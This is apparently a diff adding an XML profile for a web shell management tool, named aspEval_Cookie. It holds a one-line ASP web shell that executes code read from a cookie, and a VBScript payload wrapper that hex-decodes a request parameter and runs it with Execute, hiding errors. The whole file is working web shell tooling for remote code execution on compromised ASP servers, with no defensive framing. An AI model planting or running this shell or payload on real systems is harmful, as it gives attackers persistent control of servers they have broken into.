@@ -1,0 +1,12 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <basicSetting>
+    <name>aspEval_Cookie</name>
+    <serviceExample><![CDATA[<%Execute Request.Cookies("a")%>]]></serviceExample>
+	<mainCodeParam location="cookie" encrymode="None" >passwd</mainCodeParam>
+  </basicSetting>
+  <mainCodeSetting>
+	<funcCodeParam location="Body" encrymode="Hex" >funcCode</funcCodeParam>
+    <item><![CDATA[Function hextostr(byVal s):Dim out:For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:out=out&chr("&H"&c):Else:out=out&chr("&H"&c&Mid(s,i+2,2)):i=i+2:End If:Next:hextostr=out:End Function:On Error Resume Next:Response.Write("->|"):Set item=Request("$funcCode$"):Execute(hextostr(item)):If Err Then:Response.Write("ERROR://"&Err.Description):Err.Clear:End If:Response.Write("|<-")]]></item>
+  </mainCodeSetting>
+</customShellType>
